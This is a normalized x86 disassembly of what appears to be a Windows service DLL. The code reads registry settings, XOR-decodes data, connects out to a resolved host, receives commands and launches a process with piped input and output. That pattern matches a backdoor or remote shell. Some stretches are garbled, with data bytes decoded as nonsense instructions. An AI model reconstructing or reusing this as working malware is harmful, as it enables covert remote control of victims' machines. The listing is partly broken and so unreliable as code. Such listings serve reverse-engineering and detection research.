mov ebp [ esp + 0x2010 ]
push esi
push edi
mov ecx 0x32
xor eax eax
mov edi rw-data
mov esi rw-data
xor edx edx
[ edi ]
mov eax ebp
sub esi ebp
mov ebx [ esp + 0x201c ]
cmp edx ebx
jne r-xdata
mov [ esi + eax ] cl
inc edx
inc eax
cmp edx 0x32
jb r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
lea eax [ edx + 0x1 ]
cmp eax ebx
mov [ esp + 0x10 ] eax
jae r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2004
retn
mov cl [ eax ]
not cl
cmp cl 0x23
mov [ eax ] cl
je r-xdata
mov ecx 0x800
xor eax eax
mov edi ebp
lea esi [ esp + 0x14 ]
[ edi ]
mov ecx ebx
mov edi ebp
sub ecx edx
push rw-data
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ atoi@IAT ]
add esp 0x4
mov ecx 0x64
mov cl [ eax + ebp ]
mov esi eax
sub esi edx
inc eax
cmp eax ebx
mov [ esp + esi + 0x13 ] cl
jb r-xdata
mov edx eax
mov esi eax
shr edx 0x6
and edx 0x1000000
and esi 0x1000000
xor edx esi
add eax eax
shr edx 0x18
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
mov ecx 0x64
mov edx eax
mov esi eax
shr edx 0xd
and edx 0x20000
and esi 0x20000
xor edx esi
add eax eax
shr edx 0x11
or eax edx
dec ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov [ rw-data ] eax
pop edi
mov eax ebx
pop esi
pop ebp
sub eax ecx
pop ebx
add esp 0x2004
retn
sub_71002320
push esi
mov esi [ esp + 0xc ]
push esi
call sub_71002350
add esp 0x4
test esi esi
jbe r-xdata
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx rw-data
push ebx
sub ecx eax
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_71002350
push ebx
mov ebx [ esp + 0x8 ]
xor edx edx
cmp ebx edx
mov [ rw-data ] edx
jle r-xdata
mov al 0x1
pop ebx
retn
push ebp
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
xor ecx ecx
mov eax edi
mov ebp eax
shr ebp cl
add ecx 0x8
and ebp 0xff
xor eax ebp
cmp ecx 0x20
jl r-xdata
mov [ edx + rw-data ] al
inc edx
cmp edx ebx
mov [ rw-data ] eax
jl r-xdata
mov ecx edx
lea eax [ edi + esi ]
shl ecx 0x10
xor eax ecx
add eax edx
mov ecx eax
shr ecx 0x10
shl eax 0x10
add ecx eax
xor esi ecx
xor edi ecx
test dl 0x1
mov [ rw-data ] esi
mov [ rw-data ] edi
mov eax esi
jne r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
sub_710023f0
push ebp
mov ebp esp
push 0xffffffff
push sub_71007f60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x214
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor esi esi
push edi
cmp eax esi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x4 ] esi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
push eax
push rw-data
lea eax [ ebp - 0x220 ]
push 0x1f4
push eax
call [ _snprintf@IAT ]
mov eax [ ebp - 0x14 ]
add esp 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x220 ]
push ecx
push 0x1
push esi
push edx
push eax
call [ RegOpenKeyExA@IAT ]
je r-xdata
lea ecx [ ebp - 0x20 ]
push r--data
push ecx
jmp r-xdata
jne r-xdata
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edi [ RegQueryValueExA@IAT ]
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push edx
mov edx [ ebp - 0x14 ]
push eax
push ecx
push esi
push rw-data
push edx
mov [ ebp + 0x8 ] 0x104
call edi
mov ebx [ SetLastError@IAT ]
mov esi eax
push esi
call ebx
test esi esi
je r-xdata
jne r-xdata
mov [ ebp - 0x20 ] rw-data
call _CxxThrowException
add [ ecx + 0x51 ] dh
mov edx [ ebp + 0x10 ]
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
push edx
push eax
push 0x0
push rw-data
push ecx
mov [ ebp - 0x1c ] 0x1
mov [ ebp + 0x8 ] 0x4
call edi
mov esi eax
push esi
call ebx
test esi esi
je r-xdata
lea eax [ ebp - 0x28 ]
push r--data
push eax
mov [ ebp - 0x28 ] rw-data
call _CxxThrowException
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov esi 0x2
push eax
call [ RegCloseKey@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24 ]
push r--data
push edx
mov [ ebp - 0x24 ] rw-data
call _CxxThrowException
sbb [ eax + 0x1 ] dh
jno r-xdata
cmp eax esi
je r-xdata
add [ eax ] 0x71
adc eax 0x74000059
or dh [ ebp + 0x8 ]
sub_7100255a
mov eax [ ebp - 0x14 ]
mov esi [ ebp - 0x1c ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
ServiceMain
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
push edi
push 0x100
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
lea edx [ ebp - 0x104 ]
push edx
call [ strncpy@IAT ]
add esp 0xc
push 0x100
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
lea edx [ ebp - 0x104 ]
push edx
call [ wcstombs@IAT ]
add esp 0xc
push sub_71002740
lea eax [ ebp - 0x104 ]
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
call [ FreeConsole@IAT ]
push 0x1
push 0x0
push 0x2
call sub_710026e0
add esp 0xc
push 0x0
push 0x0
push 0x4
call sub_710026e0
add esp 0xc
xor ecx ecx
cmp [ ebp + 0x8 ] 0x2
setg cl
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x1
jle r-xdata
jmp r-xdata
lea edx [ ebp - 0x4 ]
push edx
lea eax [ ebp - 0x208 ]
push eax
lea ecx [ ebp - 0x104 ]
push ecx
call sub_710023f0
add esp 0xc
test eax eax
jne r-xdata
push 0x104
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
push eax
lea ecx [ ebp - 0x208 ]
push ecx
call [ strncpy@IAT ]
add esp 0xc
push 0x104
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
push eax
lea ecx [ ebp - 0x208 ]
push ecx
call [ wcstombs@IAT ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
je r-xdata
push 0x104
push rw-data
lea edx [ ebp - 0x208 ]
push edx
call [ strncpy@IAT ]
add esp 0xc
call sub_710027e0
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0xa
call [ Sleep@IAT ]
cmp [ rw-data ] 0x3
je r-xdata
0x130e8e8 0x0
sub_710026e0
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_71002740
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_710027c8 ]
push 0x1
push 0x0
push 0x3
call sub_710026e0
add esp 0xc
push 0xa
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_710026e0
add esp 0xc
push 0x1
push 0x0
push 0x6
call sub_710026e0
push 0x0
push 0x0
push 0x7
call sub_710026e0
add esp 0x18
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_710026e0
push 0x0
push 0x0
push 0x4
call sub_710026e0
add esp 0x18
retn 0x4
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_710026e0
add esp 0xc
retn 0x4
sub_710027e0
push ebp
mov ebp esp
push 0xffffffff
push sub_71007f88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax 0x470c
call sub_71007cf0
push ebx
push esi
push edi
clc
nop
jae r-xdata
mov [ ebp - 0x2508 ] 0xd
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x2504 ] 0x0
mov [ ebp - 0x2500 ] 0x0
mov [ ebp - 0x23ec ] 0x0
mov [ ebp - 0x24f8 ] 0x5c
mov al [ rw-data ]
mov [ ebp - 0x23e8 ] al
mov ecx 0x7ff
xor eax eax
lea edi [ ebp - 0x23e7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
jb r-xdata
call 0x6985eefa
push rw-data
push rw-data
call [ fopen@IAT ]
jae r-xdata
jle r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call [ fgetc@IAT ]
add esp 0x4
mov [ ebp - 0x24fc ] al
xor edx edx
mov [ ebp - 0x2520 ] edx
mov [ ebp - 0x251c ] edx
mov [ ebp - 0x2518 ] edx
mov [ ebp - 0x2514 ] edx
mov [ ebp - 0x2510 ] edx
movsx eax [ ebp - 0x24fc ]
push eax
push rw-data
lea ecx [ ebp - 0x2520 ]
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea edx [ ebp - 0x250c ]
push edx
push 0x0
lea eax [ ebp - 0x2520 ]
push eax
push sub_71004bd0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ fclose@IAT ]
add esp 0x4
call 0x71a694db
jno r-xdata
push rw-data
push rw-data
call [ fopen@IAT ]
jg r-xdata
hlt
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pushad
cmpsb [ esi ] [ edi ]
add [ ecx - 0x1 ] dh
adc eax fopen@IAT
mov [ ebp - 0x234 ] 0x5
mov [ ebp - 0x230 ] 0x1f4
mov [ ebp - 0x3cc ] 0x1
mov [ ebp - 0x3d0 ] 0x0
mov [ ebp - 0x3d4 ] 0xc
xor edx edx
mov [ ebp - 0x2548 ] edx
mov [ ebp - 0x2544 ] edx
mov [ ebp - 0x2540 ] edx
mov [ ebp - 0x253c ] edx
mov [ ebp - 0x2538 ] edx
xor eax eax
mov [ ebp - 0x2534 ] eax
mov [ ebp - 0x2530 ] eax
mov [ ebp - 0x252c ] eax
mov [ ebp - 0x2528 ] eax
mov [ ebp - 0x2524 ] eax
mov ecx [ ebp - 0x10 ]
push ecx
push 0x14
lea edx [ ebp - 0x2534 ]
push edx
call [ fgets@IAT ]
call 0x71a69580
jno r-xdata
call sub_71004b30
mov [ ebp - 0x3e8 ] eax
cmp [ ebp - 0x3e8 ] 0x0
jne r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
add esp 0xc
lea eax [ ebp - 0x2534 ]
push eax
push rw-data
lea ecx [ ebp - 0x2548 ]
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea edx [ ebp - 0x250c ]
push edx
push 0x0
lea eax [ ebp - 0x2548 ]
push eax
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ fclose@IAT ]
add esp 0x4
adc eax fgets@IAT
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
dec eax
cmpsb [ esi ] [ edi ]
add [ ecx - 0x1 ] dh
adc eax fopen@IAT
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x3c8 ]
push edx
push 0x101
call WSAStartup
mov [ ebp - 0x22c ] eax
cmp [ ebp - 0x22c ] 0x0
je r-xdata
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_71001000
mov [ ebp - 0x1c ] rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_71005c90
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ atol@IAT ]
add esp 0x4
push eax
call htons
mov [ ebp - 0x3e2 ] ax
mov [ ebp - 0x3e4 ] 0x2
mov edx [ ebp - 0x238 ]
push edx
call inet_addr
mov [ ebp - 0x3e0 ] eax
push 0x10
lea eax [ ebp - 0x3e4 ]
push eax
mov ecx [ rw-data ]
push ecx
call connect
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push 0x80
lea eax [ ebp - 0x25d0 ]
push eax
call gethostname
test eax eax
jne r-xdata
push 0x0
call [ time@IAT ]
add esp 0x4
push eax
call [ srand@IAT ]
add esp 0x4
call [ rand@IAT ]
cdq
mov ecx 0x28
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x238 ] rw-data
mov [ ebp - 0x14 ] rw-data
push 0x0
push 0x1
push 0x2
call socket
mov [ rw-data ] eax
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push rw-data
mov ecx [ rw-data ]
push ecx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
lea edi [ ebp - 0x25d0 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x25d0 ]
push eax
call gethostbyname
mov [ ebp - 0x254c ] eax
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
push edx
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov [ ebp - 0x24f4 ] 0x0
push 0x0
mov edx [ rw-data ]
push edx
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x254c ] 0x0
je r-xdata
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x24f4 ]
mov edx [ rw-data ]
mov [ ebp + ecx * 4 - 0x24f0 ] edx
mov eax [ ebp - 0x24f4 ]
add eax 0x1
mov [ ebp - 0x24f4 ] eax
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x24f4 ] 0x40
jae r-xdata
lea edx [ ebp - 0x234 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x24f4 ]
push eax
push 0x0
call select
test eax eax
jne r-xdata
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x2550 ] eax
mov edi [ ebp - 0x2550 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x24f4 ]
push eax
mov ecx [ rw-data ]
push ecx
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
mov edx [ rw-data ]
push edx
push rw-data
call sub_71001fe0
add esp 0x8
mov eax rw-data
mov ecx rw-data
mov edx [ ecx ]
cmp edx [ eax ]
je r-xdata
push 0x0
push 0x2000
push rw-data
mov edx [ rw-data ]
push edx
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71004b80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx rw-data
mov edx rw-data
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call closesocket
xor eax eax
mov [ ebp - 0x25e4 ] eax
mov [ ebp - 0x25e0 ] eax
mov [ ebp - 0x25dc ] eax
mov [ ebp - 0x25d8 ] eax
mov [ ebp - 0x25d4 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
lea ecx [ ebp - 0x25e4 ]
push ecx
call [ strncpy@IAT ]
add esp 0xc
lea edx [ ebp - 0x25e4 ]
push edx
call [ atof@IAT ]
add esp 0x4
fmul [ r--data ]
call _ftol
push rw-data
call sub_71005420
add esp 0x4
je r-xdata
jmp r-xdata
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
dec esp
add [ eax ] al
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
jmp r-xdata
jne r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
int3
mov edx rw-data
mov eax rw-data
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
je r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
jb r-xdata
mov [ ebp - 0x26b4 ] 0x0
mov [ ebp - 0x26ac ] 0x0
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x26a0 ]
[ edi ]
lea edx [ ebp - 0x26a0 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x26a0 ] 0x44
mov [ ebp - 0x2674 ] 0x101
mov [ ebp - 0x2670 ] 0x0
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b0 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26a8 ] eax
push 0x32
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x264c ] eax
push 0x64
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2654 ] eax
xor eax eax
mov ecx [ ebp - 0x2650 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
xor edx edx
mov eax [ ebp - 0x26b0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
xor ecx ecx
mov edx [ ebp - 0x26a8 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0xc
xor eax eax
mov edi [ ebp - 0x264c ]
[ edi ]
stosw [ edi ]
mov ecx 0x19
xor eax eax
mov edi [ ebp - 0x2654 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
mov eax [ ebp - 0x2654 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x2638 ]
[ edi ]
lea edx [ ebp - 0x2638 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x2638 ] 0x44
mov [ ebp - 0x260c ] 0x101
mov [ ebp - 0x2608 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x25f8 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x2600 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x25fc ] edx
lea eax [ ebp - 0x25f4 ]
push eax
lea ecx [ ebp - 0x2638 ]
push ecx
push 0x0
push 0x0
push 0x10
push 0x1
push 0x0
push 0x0
mov edx [ ebp - 0x1c ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
mov ecx 0x7
mov edi rw-data
jae r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x23f0 ] ecx
jge r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71005200
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
clc
nop
jae r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
